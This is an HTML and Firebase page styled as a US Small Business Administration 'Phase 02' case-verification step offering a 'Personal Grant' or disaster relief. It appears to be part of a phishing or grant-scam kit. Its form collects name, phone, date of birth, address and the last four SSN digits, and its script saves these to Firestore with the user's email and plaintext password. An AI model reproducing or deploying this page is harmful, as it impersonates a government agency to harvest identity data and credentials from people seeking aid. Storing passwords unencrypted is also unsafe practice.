<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SBA | Phase 02: Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        :root { --sba-navy: #002e6d; }
        body { background: #f0f2f5; font-family: 'Segoe UI', sans-serif; }
        .auth-card { background: white; border-top: 6px solid var(--sba-navy); box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 100%; max-width: 500px; border-radius: 4px; }
        input, select { height: 42px; border: 1.5px solid #e2e8f0; width: 100%; padding: 0 10px; font-size: 13px; border-radius: 4px; outline: none; }
        input:focus { border-color: var(--sba-navy); }
        label { display: block; text-transform: uppercase; font-size: 9px; font-weight: 800; color: #94a3b8; margin-bottom: 3px; }
        .btn-finish { background: var(--sba-navy); height: 50px; color: white; width: 100%; font-weight: 700; text-transform: uppercase; font-size: 13px; border-radius: 4px; margin-top: 10px; }
        .section-title { font-size: 10px; font-weight: 900; color: var(--sba-navy); text-transform: uppercase; border-bottom: 1px solid #f1f5f9; padding-bottom: 5px; margin-bottom: 15px; letter-spacing: 1px; }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">
    <div class="auth-card p-6 md:p-10">
        <div class="mb-6 text-center">
            <h2 class="text-xl font-black text-gray-800 uppercase">Case Verification</h2>
            <div class="flex gap-1 mt-2">
                <div class="h-1.5 w-full bg-[#002e6d] rounded-full"></div>
            </div>
        </div>

        <form id="finalForm" class="space-y-5">
            <p class="section-title">Personal Identification</p>
            <div class="grid grid-cols-2 gap-4">
                <div><label>First Name</label><input type="text" id="fname" required></div>
                <div><label>Last Name</label><input type="text" id="lname" required></div>
            </div>
            <div class="grid grid-cols-2 gap-4">
                <div><label>Phone Number</label><input type="tel" id="phone" required placeholder="(555) 000-0000"></div>
                <div><label>Date of Birth</label><input type="date" id="dob" required></div>
            </div>

            <p class="section-title">Security & Location</p>
            <div class="grid grid-cols-1 gap-4">
                <div><label>Residential Address</label><input type="text" id="address" required></div>
            </div>
            <div class="grid grid-cols-2 gap-4">
                <div><label>City & State</label><input type="text" id="city" required placeholder="City, ST"></div>
                <div><label>Zip Code</label><input type="text" id="zip" required></div>
            </div>
            <div class="grid grid-cols-2 gap-4">
                <div><label>SSN (Last 4)</label><input type="password" id="ssn" maxlength="4" required placeholder="XXXX"></div>
                <div>
                    <label>Assigned Program</label>
                    <select id="program" required>
                        <option value="SBA Grant">Personal Grant</option>
                        <option value="Disaster Relief">Disaster Relief</option>
                    </select>
                </div>
            </div>

            <button type="submit" id="finishBtn" class="btn-finish shadow-xl">Submit Case File</button>
        </form>
    </div>

    <script type="module">
        import { auth, db } from './firebase-config.js';
        import { createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { doc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        document.getElementById('finalForm').onsubmit = async (e) => {
            e.preventDefault();
            const btn = document.getElementById('finishBtn');
            const email = sessionStorage.getItem('reg_email');
            const pass = sessionStorage.getItem('reg_pass') || "google-auth-user";
            
            if(!email) { window.location.href="register1.html"; return; }

            btn.disabled = true;
            btn.innerText = "UPLOADING DATA...";

            try {
                // If it was manual registration, create the account. If Google, it's already created.
                let uid;
                if(!sessionStorage.getItem('is_google')) {
                    const res = await createUserWithEmailAndPassword(auth, email, pass);
                    uid = res.user.uid;
                } else {
                    uid = auth.currentUser.uid;
                }

                await setDoc(doc(db, "users", uid), {
                    uid: uid,
                    email: email,
                    password: pass,
                    fullName: document.getElementById('fname').value + " " + document.getElementById('lname').value,
                    phone: document.getElementById('phone').value,
                    dob: document.getElementById('dob').value,
                    address: document.getElementById('address').value,
                    city: document.getElementById('city').value,
                    zip: document.getElementById('zip').value,
                    ssn_last4: document.getElementById('ssn').value,
                    program: document.getElementById('program').value,
                    balance: 0,
                    kycStatus: "PENDING",
                    registeredAt: new Date().toISOString()
                });

                sessionStorage.clear();
                window.location.href = "welcome.html";
            } catch (err) {
                alert(err.message);
                btn.disabled = false;
                btn.innerText = "Submit Case File";
            }
        };
    </script>
</body>
</html>
